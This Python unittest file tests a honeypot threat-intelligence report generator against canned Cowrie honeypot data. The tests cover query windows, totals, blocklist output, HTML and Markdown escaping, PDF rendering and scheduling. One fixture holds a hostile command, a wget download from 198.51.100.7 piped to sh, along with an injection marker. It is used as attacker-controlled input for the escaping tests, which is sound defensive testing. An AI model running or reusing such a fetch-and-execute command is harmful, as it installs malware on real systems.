"""
Unit tests for tools/generate_report.py (no Elasticsearch needed - a fake client returns a
canned aggregation response shaped exactly like the real one).

Run:  python -m unittest discover -s tests -v        (from the project root)
"""
import csv
import os
import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "tools"))
import generate_report as gr  # noqa: E402

NOW = datetime(2026, 11, 12, 12, 0, tzinfo=timezone.utc)


def b(key, count, **subs):
    d = {"key": key, "doc_count": count}
    d.update(subs)
    return d


def terms(*buckets):
    return {"buckets": list(buckets)}


def val(v):
    return {"value": v}


def ip_bucket(ip, count, risk, country, org, verdict, abuse=None, tags=()):
    src = {"source": {"as": {"number": 64500}}, "ti": {"otx": {"pulse_count": len(tags), "tags": list(tags)}}}
    if abuse is not None:
        src["ti"]["abuseipdb"] = {"confidence_score": abuse}
    return b(ip, count, sessions=val(count // 3), max_risk=val(risk), ti_score=val(abuse or 0),
             country=terms(b(country, count)), asn_org=terms(b(org, count)), verdict=terms(b(verdict, count)),
             latest={"hits": {"hits": [{"_source": src}]}})


def canned_current():
    tl = [b(1_700_000_000_000 + i * 3_600_000, c, key_as_string=f"2026-11-12T{i:02d}:00:00.000Z")
          for i, c in enumerate([5, 10, 40, 120, 60, 30, 8, 3])]
    return {
        "hits": {"total": {"value": 276, "relation": "eq"}},
        "aggregations": {
            "actions": terms(b("cowrie.login.failed", 150), b("cowrie.login.success", 12), b("cowrie.command.input", 40),
                             b("cowrie.session.file_download", 6), b("cowrie.session.connect", 60)),
            "unique_ips": val(31), "sessions": val(60), "timeline": {"buckets": tl},
            "risk_levels": terms(b("low", 200), b("medium", 40), b("high", 24), b("critical", 12)),
            "top_ips_risk": terms(
                ip_bucket("198.51.100.10", 90, 94, "Netherlands", "Evil Hosting BV", "malicious", 98, ("mirai", "botnet")),
                ip_bucket("192.0.2.66", 20, 15, "United States", "Search Engine LLC", "benign", 5),
                ip_bucket("203.0.113.45", 30, 72, "Brazil", "Telecom SA", "suspicious", 40)),
            "top_ips_volume": terms(ip_bucket("198.51.100.10", 90, 94, "Netherlands", "Evil Hosting BV", "malicious", 98)),
            "countries": terms(b("Netherlands", 100, ips=val(5)), b("Brazil", 60, ips=val(9)), b("China", 40, ips=val(11))),
            "asns": terms(b("Evil Hosting BV", 100, ips=val(5), max_risk=val(94))),
            "ports": {"doc_count": 60, "t": terms(b(2222, 45), b(2223, 15))},
            "protocols": {"doc_count": 60, "t": terms(b("ssh", 45), b("telnet", 15))},
            "usernames": terms(b("root", 80), b("admin", 40)), "passwords": terms(b("123456", 50), b("admin", 30)),
            "credentials": terms(b("root:123456", 45), b("admin:admin", 20)),
            "commands": terms(b("uname -a", 20), b("cd /tmp; wget http://198.51.100.7/x86_64 | sh <evil> & `id`", 6)),
            "techniques": terms(b("T1110", 150, name=terms(b("Brute Force", 150))), b("T1098.004", 3, name=terms(b("SSH Authorized Keys", 3)))),
            "malware": terms(b("a" * 64, 6, urls=terms(b("http://198.51.100.7/x86_64", 6)), vt=val(41),
                               family=terms(b("trojan.mirai", 6)), ips=val(2))),
            "urls": terms(b("http://198.51.100.7/x86_64", 6)),
            "hassh": terms(b("c" * 32, 30, client=terms(b("SSH-2.0-libssh_0.9.6", 30)), ips=val(8))),
            "verdicts": terms(b("malicious", 120, ips=val(6)), b("benign", 20, ips=val(1))),
            "otx_tags": terms(b("mirai", 100), b("botnet", 90)),
            "malicious_ips": {"doc_count": 120, "ips": val(6)},
            "high_risk": {"doc_count": 36, "ips": val(7)},
            "simulated": {"doc_count": 276},
        },
    }


def canned_previous():
    return {"hits": {"total": {"value": 200}},
            "aggregations": {"unique_ips": val(25), "high_risk": {"doc_count": 30},
                             "malicious_ips": {"doc_count": 80, "ips": val(4)}}}


class FakeES:
    def __init__(self):
        self.calls = []

    def search(self, **kw):
        self.calls.append(kw)
        return canned_current() if len(self.calls) == 1 else canned_previous()


class ReportTests(unittest.TestCase):
    def setUp(self):
        self.es = FakeES()
        self.report = gr.ElasticsearchSource(self.es).fetch(24, now=NOW)

    # ---- query layer
    def test_queries_use_correct_windows_and_filters(self):
        cur, prev = self.es.calls
        rng = cur["query"]["bool"]["filter"][0]["range"]["@timestamp"]
        self.assertEqual(rng, {"gte": "2026-11-11T12:00:00.000Z", "lt": "2026-11-12T12:00:00.000Z"})
        prng = prev["query"]["bool"]["filter"][0]["range"]["@timestamp"]
        self.assertEqual(prng["lt"], rng["gte"])            # previous window ends where current begins
        self.assertEqual(cur["size"], 0)
        self.assertNotIn("must_not", cur["query"]["bool"])

    def test_exclude_simulated_adds_must_not(self):
        q = gr.build_query(NOW - timedelta(hours=1), NOW, exclude_simulated=True)
        self.assertEqual(q["bool"]["must_not"], [{"term": {"tags": "simulated"}}])

    def test_aggs_are_json_serialisable_and_named(self):
        import json
        aggs = gr.build_aggs(NOW - timedelta(hours=24), NOW)
        json.dumps(aggs)
        for name in ("timeline", "top_ips_risk", "malware", "credentials", "commands", "techniques", "high_risk"):
            self.assertIn(name, aggs)
        self.assertEqual(aggs["timeline"]["date_histogram"]["fixed_interval"], "1h")
        self.assertEqual(aggs["top_ips_risk"]["terms"]["order"], {"max_risk": "desc"})

    # ---- parse layer
    def test_totals_and_deltas(self):
        t = self.report["totals"]
        self.assertEqual((t["events"], t["unique_ips"], t["sessions"]), (276, 31, 60))
        self.assertEqual((t["login_failed"], t["login_success"], t["login_attempts"]), (150, 12, 162))
        self.assertEqual((t["downloads"], t["high_risk_events"], t["critical_events"], t["malicious_ips"]), (6, 36, 12, 6))
        self.assertEqual(self.report["deltas"]["unique_ips"], 24.0)       # 25 -> 31
        self.assertEqual(self.report["deltas"]["high_risk_events"], 20.0)  # 30 -> 36
        self.assertEqual(self.report["threat_level"], "CRITICAL")

    def test_threat_level_ladder(self):
        base = dict(critical_events=0, high_risk_events=0, login_success=0)
        self.assertEqual(gr.threat_level(base), "LOW")
        self.assertEqual(gr.threat_level({**base, "login_success": 1}), "MEDIUM")
        self.assertEqual(gr.threat_level({**base, "high_risk_events": 1}), "HIGH")
        self.assertEqual(gr.threat_level({**base, "critical_events": 1}), "CRITICAL")

    def test_ip_rows(self):
        top = self.report["top_ips_risk"][0]
        self.assertEqual((top["ip"], top["max_risk"], top["verdict"], top["abuse_score"]), ("198.51.100.10", 94, "malicious", 98))
        self.assertEqual(top["tags"], ["mirai", "botnet"])
        self.assertEqual(top["asn"], 64500)

    def test_blocklist_excludes_benign_false_positives(self):
        bl = gr.blocklist(self.report)
        self.assertIn("198.51.100.10", bl)
        self.assertIn("203.0.113.45", bl)
        self.assertNotIn("192.0.2.66", bl)

    def test_division_by_zero_safe_when_no_previous(self):
        self.assertIsNone(gr.pct_change(5, 0))

    def test_empty_period_produces_valid_report(self):
        empty = {"hits": {"total": {"value": 0}}, "aggregations": {}}
        rep = gr.parse_report(empty, empty, NOW - timedelta(hours=24), NOW, 24, False)
        self.assertEqual(rep["threat_level"], "LOW")
        self.assertTrue(rep["recommendations"])
        with tempfile.TemporaryDirectory() as d:
            files = gr.write_reports(rep, d, ["md", "html", "pdf"], "t")
            for f in files:
                if f.endswith(".txt"):          # an empty blocklist is the correct result for an empty period
                    self.assertEqual(os.path.getsize(f), 0)
                else:
                    self.assertGreater(os.path.getsize(f), 0, f)

    # ---- presentation layer
    def test_markdown_escapes_pipes_and_backticks(self):
        md = gr.render_markdown(self.report)
        self.assertIn("# Threat Intelligence Report", md)
        self.assertIn("**Overall threat level:** **CRITICAL**", md)
        self.assertNotIn("| cd /tmp; wget http://198.51.100.7/x86_64 | sh", md)   # raw pipe would break the table
        self.assertIn("\\|", md)

    def test_html_escapes_attacker_controlled_strings(self):
        h = gr.render_html(self.report)
        self.assertNotIn("<evil>", h)           # command text must be escaped (stored-XSS guard)
        self.assertIn("&lt;evil&gt;", h)
        self.assertIn("<svg", h)
        self.assertIn("Demo data", h)           # simulated banner

    def test_pdf_is_valid(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "r.pdf")
            gr.render_pdf(self.report, p)
            with open(p, "rb") as fh:
                self.assertEqual(fh.read(5), b"%PDF-")
            self.assertGreater(os.path.getsize(p), 5000)

    def test_exports(self):
        with tempfile.TemporaryDirectory() as d:
            files = gr.write_reports(self.report, d, ["md"], "stamp")
            csv_path = [f for f in files if f.endswith(".csv")][0]
            with open(csv_path, encoding="utf-8") as fh:
                rows = list(csv.DictReader(fh))
            self.assertEqual({r["type"] for r in rows}, {"ipv4", "sha256", "url"})
            with open([f for f in files if f.endswith(".txt")][0], encoding="utf-8") as fh:
                txt = fh.read().split()
            self.assertEqual(txt, ["198.51.100.10", "203.0.113.45"])

    def test_unicode_commands_do_not_crash_pdf(self):
        rep = gr.ElasticsearchSource(FakeES()).fetch(24, now=NOW)
        rep["commands"].append({"key": "echo ☃ 中文", "count": 1})
        with tempfile.TemporaryDirectory() as d:
            gr.render_pdf(rep, os.path.join(d, "u.pdf"))

    # ---- automation layer
    def test_scheduler_next_run(self):
        from zoneinfo import ZoneInfo
        tz = ZoneInfo("Asia/Kolkata")
        now = datetime(2026, 11, 12, 6, 0, tzinfo=tz)
        self.assertEqual(gr.seconds_until("07:00", "Asia/Kolkata", now), 3600)
        now = datetime(2026, 11, 12, 8, 0, tzinfo=tz)
        self.assertEqual(gr.seconds_until("07:00", "Asia/Kolkata", now), 23 * 3600)

    def test_cli_args(self):
        a = gr.parse_args(["--hours", "6", "--formats", "md,pdf", "--exclude-simulated"])
        self.assertEqual((a.hours, a.formats, a.exclude_simulated), (6, ["md", "pdf"], True))
        with self.assertRaises(SystemExit):
            gr.parse_args(["--formats", "docx"])


if __name__ == "__main__":
    unittest.main()
